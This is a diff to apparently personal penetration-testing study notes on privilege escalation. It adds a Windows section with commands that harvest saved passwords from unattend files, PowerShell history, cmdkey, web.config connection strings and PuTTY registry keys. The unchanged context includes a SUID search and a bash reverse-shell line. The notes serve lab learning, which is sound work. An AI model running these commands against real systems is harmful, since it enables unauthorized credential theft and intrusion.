@@ -115,6 +115,8 @@ find / -name gcc*
 
 find / -perm -u=s -type f 2>/dev/null  //Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
 ```
+
+??? how to search file or directory in windows
 ###  Automated 
 1. [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 2. [LinEnum](https://github.com/rebootuser/LinEnum)
@@ -212,6 +214,56 @@ cat /etc/crontab
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 ```
 
-###  Privilege Escalation: PATH 
+###  Privilege Escalation: PATH   
+
+
+# Windows Privilege Escalation  
+
+## Harvesting Passwords from Usual Spots 
+```xml
+C:\Unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml 
+
+<Credentials>
+    <Username>Administrator</Username>
+    <Domain>thm.local</Domain>
+    <Password>MyPassword123</Password>
+</Credentials>
+```
+
+## Powershell History
+
+command: 
+```cmd
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+```powershell
+type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
+## Saved Windows Credentials
+
+```cmd
+cmdkey /list
+
+runas /savecred /user:admin cmd.exe
+```
+
+## IIS Configuration
+```shell
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString #a quick way to find database connection strings
+```
+## Retrieve Credentials from Software: PuTTY 
+```shell
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+```
+
+>note: Other software have methods to recover any passwords the user has saved   
 
 
